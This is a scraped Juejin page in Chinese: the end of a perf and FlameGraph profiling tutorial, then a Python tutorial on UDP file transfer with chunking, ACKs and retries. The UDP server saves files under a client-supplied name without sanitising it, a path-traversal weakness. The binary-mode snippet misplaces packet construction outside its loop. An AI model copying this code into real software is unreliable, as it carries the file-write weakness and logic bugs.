<pre><code class="hljs language-bash" lang="bash">sudo perf record -e cpu-clock -g -p 2548
<span class="hljs-comment"># -g         告诉 perf record 额外记录函数的调用关系</span>
<span class="hljs-comment"># -e cpu-clock  监控的指标为 cpu 周期 </span>
<span class="hljs-comment"># -p         指定需要 record 的进程 pid</span>
</code></pre>
<blockquote>
<p>💡 采样一段时间后，可以使用 <code>Ctrl+C</code> 停止命令，这时会生成 <code>perf.data</code> 文件（默认文件名）</p>
</blockquote>
<h4 data-id="heading-14">4.5 perf report</h4>
<p>主要用来分析 <code>perf record</code> 生成的 <code>perf.data</code> 文件。</p>
<hr/>
<h3 data-id="heading-15">五、生成火焰图</h3>
<h4 data-id="heading-16">5.1 操作流程</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart LR
    A[perf record&lt;br/&gt;采集数据] --&gt; B[perf script&lt;br/&gt;导出文本]
    B --&gt; C[stackcollapse-perf.pl&lt;br/&gt;折叠堆栈]
    C --&gt; D[flamegraph.pl&lt;br/&gt;生成 SVG]
    D --&gt; E[浏览器查看&lt;br/&gt;火焰图]
</code></pre>
<h4 data-id="heading-17">5.2 第一步：采样并记录性能数据</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 对 CPU 所有进程 99Hz 采集，执行 60 秒后采集完成，当前目录生成 perf.data 文件</span>
perf record -F 99 -a -g -- <span class="hljs-built_in">sleep</span> 60
perf script &gt; out.perf

<span class="hljs-comment"># 或者：对进程 id 181 采集，采集时间 60 秒，执行期间不要退出</span>
perf record -F 99 -p 181 -g -- <span class="hljs-built_in">sleep</span> 60
perf script &gt; out.perf
</code></pre>
<h4 data-id="heading-18">5.3 第二步：用 FlameGraph 工具解析</h4>
<p><strong>工具仓库</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fbrendangregg%2FFlameGraph" target="_blank" title="https://github.com/brendangregg/FlameGraph" ref="nofollow noopener noreferrer">github.com/brendangreg…</a></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 克隆工具仓库</span>
git <span class="hljs-built_in">clone</span> https://github.com/brendangregg/FlameGraph.git
<span class="hljs-built_in">cd</span> FlameGraph

<span class="hljs-comment"># 折叠堆栈信息</span>
./stackcollapse-perf.pl out.perf &gt; out.folded

<span class="hljs-comment"># 生成火焰图</span>
./flamegraph.pl out.folded &gt; kernel.svg
</code></pre>
<h4 data-id="heading-19">5.4 解读火焰图</h4>
<p>火焰图是基于 stack 信息生成的 SVG 图片，用来展示 CPU 的调用栈。</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    subgraph 火焰图结构
        direction TB
        Y[Y 轴：调用栈深度&lt;br/&gt;顶部是正在执行的函数&lt;br/&gt;下方是父函数]
        X[X 轴：抽样数/执行时间&lt;br/&gt;宽度越大执行时间越长&lt;br/&gt;按字母顺序排列]
    end
</code></pre>
<p><strong>关键要点</strong>：</p>





























<table><thead><tr><th>元素</th><th>说明</th></tr></thead><tbody><tr><td><strong>方框</strong></td><td>每个方框代表一个函数</td></tr><tr><td><strong>宽度</strong></td><td>方框越宽，代表执行时间越久</td></tr><tr><td><strong>高度</strong></td><td>楼层越高，代表调用栈越深</td></tr><tr><td><strong>顶层</strong></td><td>最顶层的函数是叶子函数（正在执行的函数）</td></tr><tr><td><strong>平顶</strong></td><td>如果有"平顶"（plateaus），表示该函数可能存在性能问题</td></tr></tbody></table>
<blockquote>
<p>🎯 <strong>分析技巧</strong>：火焰图就是看顶层的哪个函数占据的宽度最大。只要有"平顶"，就表示该函数可能存在性能问题，是优化的重点目标。</p>
</blockquote>
<hr/>
<h3 data-id="heading-20">附录：快速参考卡片</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 实时查看热点函数</span>
sudo perf top -p &lt;pid&gt;

<span class="hljs-comment"># 统计性能事件</span>
sudo perf <span class="hljs-built_in">stat</span> -p &lt;pid&gt; -d

<span class="hljs-comment"># 采样并生成火焰图（完整流程）</span>
sudo perf record -F 99 -p &lt;pid&gt; -g -- <span class="hljs-built_in">sleep</span> 60
perf script &gt; out.perf
./stackcollapse-perf.pl out.perf &gt; out.folded
./flamegraph.pl out.folded &gt; flame.svg
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Python实现基于UDP的文件传输：完整教程（附避坑指南）]]></title>    <link>https://juejin.cn/post/7581693431740006463</link>    <guid>https://juejin.cn/post/7581693431740006463</guid>    <pubDate>2025-12-09T14:19:01.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581693431740006463" data-draft-id="7581669438577426468" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Python实现基于UDP的文件传输：完整教程（附避坑指南）"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2025-12-09T14:19:01.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="刚哥的进化路"/> <meta itemprop="url" content="https://juejin.cn/user/71892859621675"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Python实现基于UDP的文件传输：完整教程（附避坑指南）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/71892859621675/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    刚哥的进化路
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T14:19:01.000Z" title="Tue Dec 09 2025 14:19:01 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>UDP本身是无连接、不可靠的传输协议，直接用来传文件容易出现丢包、乱序问题，但通过“分块传输+校验+重传”的设计，依然能实现稳定的文件传输。</p>
<h2 data-id="heading-0">一、UDP文件传输的核心设计思路</h2>
<p>UDP不保证数据送达，所以要先解决三个关键问题：</p>
<ol>
<li><strong>分块传输</strong>：将大文件拆分成固定大小的数据包（如1024字节），避免单次发送数据过大导致丢包；</li>
<li><strong>包标识</strong>：每个数据包添加“序号+总包数+校验位”，服务端接收后能校验完整性、排序重组；</li>
<li><strong>确认重传</strong>：服务端接收每个数据包后返回确认（ACK），客户端未收到ACK则重传该数据包，保证可靠性。</li>
</ol>
<p>核心流程：</p>
<ul>
<li><strong>客户端</strong>：读取文件→分块→加标识→发送数据包→等待ACK→重传失败包→发送结束标识；</li>
<li><strong>服务端</strong>：接收数据包→校验→排序→重组→保存文件→返回ACK。</li>
</ul>
<h2 data-id="heading-1">二、完整实现代码</h2>
<h3 data-id="heading-2">1. 服务端代码（接收文件）</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> socket
<span class="hljs-keyword">import</span> os

<span class="hljs-comment"># 配置参数</span>
UDP_IP = <span class="hljs-string">""</span>  <span class="hljs-comment"># 监听所有本机IP</span>
UDP_PORT = <span class="hljs-number">9999</span>
BUFFER_SIZE = <span class="hljs-number">1024</span>  <span class="hljs-comment"># 数据包大小（需和客户端一致）</span>
SAVE_DIR = <span class="hljs-string">"received_files"</span>  <span class="hljs-comment"># 文件保存目录</span>

<span class="hljs-comment"># 创建保存目录</span>
<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(SAVE_DIR):
    os.makedirs(SAVE_DIR)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">udp_file_server</span>():
    <span class="hljs-comment"># 1. 创建UDP Socket</span>
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_socket.bind((UDP_IP, UDP_PORT))
    <span class="hljs-comment"># 允许端口复用，避免重启报错</span>
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="hljs-number">1</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"UDP文件服务端已启动，监听端口 <span class="hljs-subst">{UDP_PORT}</span>..."</span>)

    <span class="hljs-comment"># 初始化接收状态</span>
    file_data = {}  <span class="hljs-comment"># 存储接收的数据包 {序号: 数据}</span>
    total_packets = <span class="hljs-number">0</span>  <span class="hljs-comment"># 总包数</span>
    file_name = <span class="hljs-string">""</span>  <span class="hljs-comment"># 文件名</span>
    client_addr = <span class="hljs-literal">None</span>  <span class="hljs-comment"># 客户端地址</span>

    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
            <span class="hljs-comment"># 2. 接收数据包（阻塞）</span>
            data, client_addr = server_socket.recvfrom(BUFFER_SIZE + <span class="hljs-number">32</span>)  <span class="hljs-comment"># 预留标识位空间</span>
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data:
                <span class="hljs-keyword">continue</span>

            <span class="hljs-comment"># 解析数据包标识："文件名|总包数|当前序号|数据"</span>
            <span class="hljs-keyword">try</span>:
                <span class="hljs-comment"># 分割标识和数据（用|分隔，最后一段是文件数据）</span>
                parts = data.decode(<span class="hljs-string">'utf-8'</span>, errors=<span class="hljs-string">'ignore'</span>).split(<span class="hljs-string">'|'</span>, <span class="hljs-number">3</span>)
                <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(parts) != <span class="hljs-number">4</span>:
                    <span class="hljs-comment"># 不是文件数据包，可能是结束标识</span>
                    <span class="hljs-keyword">if</span> data.decode(<span class="hljs-string">'utf-8'</span>) == <span class="hljs-string">"TRANSFER_FINISH"</span>:
                        <span class="hljs-built_in">print</span>(<span class="hljs-string">"客户端发送结束标识，开始重组文件..."</span>)
                        <span class="hljs-keyword">break</span>
                    <span class="hljs-keyword">continue</span>

                file_name, total_packets_str, packet_num_str, file_chunk = parts
                total_packets = <span class="hljs-built_in">int</span>(total_packets_str)
                packet_num = <span class="hljs-built_in">int</span>(packet_num_str)
            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
                <span class="hljs-built_in">print</span>(<span class="hljs-string">f"数据包解析失败：<span class="hljs-subst">{e}</span>"</span>)
                <span class="hljs-comment"># 返回错误ACK</span>
                server_socket.sendto(<span class="hljs-string">f"ERR|<span class="hljs-subst">{packet_num}</span>"</span>.encode(<span class="hljs-string">'utf-8'</span>), client_addr)
                <span class="hljs-keyword">continue</span>

            <span class="hljs-comment"># 3. 校验并保存数据包</span>
            <span class="hljs-keyword">if</span> <span class="hljs-number">1</span> &lt;= packet_num &lt;= total_packets:
                file_data[packet_num] = file_chunk
                <span class="hljs-comment"># 返回成功ACK</span>
                server_socket.sendto(<span class="hljs-string">f"ACK|<span class="hljs-subst">{packet_num}</span>"</span>.encode(<span class="hljs-string">'utf-8'</span>), client_addr)
                <span class="hljs-comment"># 打印进度</span>
                progress = (<span class="hljs-built_in">len</span>(file_data) / total_packets) * <span class="hljs-number">100</span>
                <span class="hljs-built_in">print</span>(<span class="hljs-string">f"接收进度：<span class="hljs-subst">{progress:<span class="hljs-number">.1</span>f}</span>% (<span class="hljs-subst">{<span class="hljs-built_in">len</span>(file_data)}</span>/<span class="hljs-subst">{total_packets}</span>)"</span>, end=<span class="hljs-string">'\r'</span>)

        <span class="hljs-comment"># 4. 重组并保存文件</span>
        <span class="hljs-keyword">if</span> file_data <span class="hljs-keyword">and</span> total_packets &gt; <span class="hljs-number">0</span>:
            <span class="hljs-comment"># 按序号排序数据包</span>
            sorted_chunks = [file_data[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, total_packets + <span class="hljs-number">1</span>) <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> file_data]
            <span class="hljs-comment"># 拼接所有数据</span>
            file_path = os.path.join(SAVE_DIR, file_name)
            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">'wb'</span>) <span class="hljs-keyword">as</span> f:
                <span class="hljs-keyword">for</span> chunk <span class="hljs-keyword">in</span> sorted_chunks:
                    f.write(chunk.encode(<span class="hljs-string">'utf-8'</span>))  <span class="hljs-comment"># 若传二进制文件，需调整编码逻辑（见进阶部分）</span>
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\n文件接收完成！保存路径：<span class="hljs-subst">{file_path}</span>"</span>)
            <span class="hljs-comment"># 发送完成确认</span>
            server_socket.sendto(<span class="hljs-string">"FILE_SAVED"</span>.encode(<span class="hljs-string">'utf-8'</span>), client_addr)
        <span class="hljs-keyword">else</span>:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n未接收到完整文件数据"</span>)

    <span class="hljs-keyword">except</span> KeyboardInterrupt:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n服务端手动停止"</span>)
    <span class="hljs-keyword">finally</span>:
        server_socket.close()

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    udp_file_server()
</code></pre>
<h3 data-id="heading-3">2. 客户端代码（发送文件）</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> socket
<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> time

<span class="hljs-comment"># 配置参数</span>
SERVER_IP = <span class="hljs-string">"127.0.0.1"</span>  <span class="hljs-comment"># 服务端IP（远程传输改实际IP）</span>
SERVER_PORT = <span class="hljs-number">9999</span>
BUFFER_SIZE = <span class="hljs-number">1024</span>  <span class="hljs-comment"># 每个数据包的文件数据大小</span>
RETRY_TIMES = <span class="hljs-number">3</span>  <span class="hljs-comment"># 单个数据包最大重传次数</span>
RETRY_INTERVAL = <span class="hljs-number">0.5</span>  <span class="hljs-comment"># 重传间隔（秒）</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">udp_file_client</span>(<span class="hljs-params">file_path</span>):
    <span class="hljs-comment"># 1. 检查文件是否存在</span>
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(file_path):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"错误：文件 <span class="hljs-subst">{file_path}</span> 不存在"</span>)
        <span class="hljs-keyword">return</span>

    <span class="hljs-comment"># 获取文件名和文件大小</span>
    file_name = os.path.basename(file_path)
    file_size = os.path.getsize(file_path)
    <span class="hljs-comment"># 计算总包数（向上取整）</span>
    total_packets = (file_size + BUFFER_SIZE - <span class="hljs-number">1</span>) // BUFFER_SIZE
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"准备发送文件：<span class="hljs-subst">{file_name}</span>，大小：<span class="hljs-subst">{file_size}</span>字节，总包数：<span class="hljs-subst">{total_packets}</span>"</span>)

    <span class="hljs-comment"># 2. 创建UDP Socket</span>
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="hljs-number">1</span>)
    <span class="hljs-comment"># 设置超时（避免等待ACK卡死）</span>
    client_socket.settimeout(<span class="hljs-number">2</span>)

    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># 3. 读取文件并分块发送</span>
        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">'r'</span>, encoding=<span class="hljs-string">'utf-8'</span>) <span class="hljs-keyword">as</span> f:  <span class="hljs-comment"># 二进制文件用'rb'（见进阶部分）</span>
            <span class="hljs-keyword">for</span> packet_num <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, total_packets + <span class="hljs-number">1</span>):
                <span class="hljs-comment"># 读取当前块数据</span>
                file_chunk = f.read(BUFFER_SIZE)
                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> file_chunk:
                    <span class="hljs-keyword">break</span>

                <span class="hljs-comment"># 构造数据包："文件名|总包数|当前序号|数据"</span>
                packet_data = <span class="hljs-string">f"<span class="hljs-subst">{file_name}</span>|<span class="hljs-subst">{total_packets}</span>|<span class="hljs-subst">{packet_num}</span>|<span class="hljs-subst">{file_chunk}</span>"</span>.encode(<span class="hljs-string">'utf-8'</span>)
                retry_count = <span class="hljs-number">0</span>
                ack_received = <span class="hljs-literal">False</span>

                <span class="hljs-comment"># 4. 发送并等待ACK，失败则重传</span>
                <span class="hljs-keyword">while</span> retry_count &lt; RETRY_TIMES <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> ack_received:
                    <span class="hljs-keyword">try</span>:
                        <span class="hljs-comment"># 发送数据包</span>
                        client_socket.sendto(packet_data, (SERVER_IP, SERVER_PORT))
                        <span class="hljs-comment"># 等待ACK</span>
                        ack_data, _ = client_socket.recvfrom(<span class="hljs-number">128</span>)
                        ack_parts = ack_data.decode(<span class="hljs-string">'utf-8'</span>).split(<span class="hljs-string">'|'</span>)
                        <span class="hljs-keyword">if</span> ack_parts[<span class="hljs-number">0</span>] == <span class="hljs-string">"ACK"</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">int</span>(ack_parts[<span class="hljs-number">1</span>]) == packet_num:
                            ack_received = <span class="hljs-literal">True</span>
                            <span class="hljs-comment"># 打印进度</span>
                            progress = (packet_num / total_packets) * <span class="hljs-number">100</span>
                            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"发送进度：<span class="hljs-subst">{progress:<span class="hljs-number">.1</span>f}</span>% (<span class="hljs-subst">{packet_num}</span>/<span class="hljs-subst">{total_packets}</span>)"</span>, end=<span class="hljs-string">'\r'</span>)
                    <span class="hljs-keyword">except</span> socket.timeout:
                        retry_count += <span class="hljs-number">1</span>
                        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\n数据包 <span class="hljs-subst">{packet_num}</span> 超时，重传 <span class="hljs-subst">{retry_count}</span>/<span class="hljs-subst">{RETRY_TIMES}</span>"</span>)
                        time.sleep(RETRY_INTERVAL)
                    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
                        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\n数据包 <span class="hljs-subst">{packet_num}</span> 发送失败：<span class="hljs-subst">{e}</span>"</span>)
                        retry_count += <span class="hljs-number">1</span>
                        time.sleep(RETRY_INTERVAL)

                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ack_received:
                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\n错误：数据包 <span class="hljs-subst">{packet_num}</span> 重传<span class="hljs-subst">{RETRY_TIMES}</span>次失败，传输终止"</span>)
                    <span class="hljs-keyword">return</span>

        <span class="hljs-comment"># 5. 发送结束标识</span>
        client_socket.sendto(<span class="hljs-string">"TRANSFER_FINISH"</span>.encode(<span class="hljs-string">'utf-8'</span>), (SERVER_IP, SERVER_PORT))
        <span class="hljs-comment"># 等待服务端保存完成确认</span>
        <span class="hljs-keyword">try</span>:
            finish_ack, _ = client_socket.recvfrom(<span class="hljs-number">128</span>)
            <span class="hljs-keyword">if</span> finish_ack.decode(<span class="hljs-string">'utf-8'</span>) == <span class="hljs-string">"FILE_SAVED"</span>:
                <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n文件发送完成！服务端已保存"</span>)
        <span class="hljs-keyword">except</span> socket.timeout:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n未收到服务端完成确认，但数据已发送完毕"</span>)

    <span class="hljs-keyword">except</span> KeyboardInterrupt:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n客户端手动停止"</span>)
    <span class="hljs-keyword">finally</span>:
        client_socket.close()

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    <span class="hljs-comment"># 替换为你要发送的文件路径（本地测试用绝对/相对路径）</span>
    target_file = <span class="hljs-string">"test.txt"</span>  <span class="hljs-comment"># 示例：发送当前目录的test.txt</span>
    udp_file_client(target_file)
</code></pre>
<h2 data-id="heading-4">三、基础版使用步骤</h2>
<ol>
<li><strong>准备测试文件</strong>：在客户端目录创建一个<code>test.txt</code>文件（内容任意）；</li>
<li><strong>启动服务端</strong>：运行服务端代码，控制台显示“UDP文件服务端已启动”；</li>
<li><strong>启动客户端</strong>：修改客户端代码中<code>target_file</code>为实际文件路径，运行客户端；</li>
<li><strong>查看结果</strong>：服务端控制台显示传输进度，完成后文件会保存到<code>received_files</code>目录。</li>
</ol>
<h2 data-id="heading-5">四、关键优化：支持二进制文件（图片/视频/压缩包）</h2>
<p>基础版仅支持文本文件，要传输图片、视频等二进制文件，需修改<strong>编码逻辑</strong>（核心是避免字符编码导致的数据损坏）：</p>
<h3 data-id="heading-6">1. 客户端修改（读取二进制文件）</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 替换客户端文件读取部分</span>
<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">'rb'</span>) <span class="hljs-keyword">as</span> f:  <span class="hljs-comment"># 改为二进制读取</span>
    <span class="hljs-keyword">for</span> packet_num <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, total_packets + <span class="hljs-number">1</span>):
        file_chunk = f.read(BUFFER_SIZE)
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> file_chunk:
            <span class="hljs-keyword">break</span>
    <span class="hljs-comment"># 构造数据包：用特殊分隔符（如b'|||'），避免二进制数据冲突</span>
    packet_header = <span class="hljs-string">f"<span class="hljs-subst">{file_name}</span>|<span class="hljs-subst">{total_packets}</span>|<span class="hljs-subst">{packet_num}</span>"</span>.encode(<span class="hljs-string">'utf-8'</span>)
    packet_data = packet_header + <span class="hljs-string">b'|||'</span> + file_chunk  <span class="hljs-comment"># 二进制拼接</span>
</code></pre>
<h3 data-id="heading-7">2. 服务端修改（解析二进制数据）</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 替换服务端数据包解析部分</span>
<span class="hljs-keyword">try</span>:
    <span class="hljs-comment"># 分割头部和二进制数据（按b'|||'分割）</span>
    header, file_chunk = data.split(<span class="hljs-string">b'|||'</span>, <span class="hljs-number">1</span>)
    <span class="hljs-comment"># 解析头部（转字符串）</span>
    parts = header.decode(<span class="hljs-string">'utf-8'</span>).split(<span class="hljs-string">'|'</span>, <span class="hljs-number">2</span>)
    file_name, total_packets_str, packet_num_str = parts
    total_packets = <span class="hljs-built_in">int</span>(total_packets_str)
    packet_num = <span class="hljs-built_in">int</span>(packet_num_str)
<span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"二进制数据包解析失败：<span class="hljs-subst">{e}</span>"</span>)
    <span class="hljs-keyword">continue</span>

<span class="hljs-comment"># 保存时直接写入二进制数据</span>
<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">'wb'</span>) <span class="hljs-keyword">as</span> f:
    <span class="hljs-keyword">for</span> chunk <span class="hljs-keyword">in</span> sorted_chunks:
        f.write(chunk)  <span class="hljs-comment"># 无需encode，直接写二进制</span>
</code></pre>
<h2 data-id="heading-8">五、避坑指南：常见问题与解决方案</h2>
<h3 data-id="heading-9">1. 数据包丢包/重传失败</h3>
<ul>
<li>原因：UDP无可靠性保证，网络波动易丢包；</li>
<li>解决方案：
<ul>
<li>增大<code>RETRY_TIMES</code>（如改为5），延长<code>RETRY_INTERVAL</code>；</li>
<li>减小<code>BUFFER_SIZE</code>（如改为512），降低单包传输压力；</li>
<li>远程传输时确保服务端端口已开放防火墙。</li>
</ul>
</li>
</ul>
<h3 data-id="heading-10">2. 大文件传输卡顿</h3>
<ul>
<li>原因：循环发送未做速率控制，网络拥塞；</li>
<li>解决方案：在客户端发送每个数据包后添加<code>time.sleep(0.001)</code>，控制发送速率。</li>
</ul>
<h3 data-id="heading-11">3. 数据包解析错误</h3>
<ul>
<li>原因：分隔符（|）与文件内容冲突；</li>
<li>解决方案：改用更复杂的分隔符（如<code>|||</code>或随机字符串），或对头部做Base64编码。</li>
</ul>
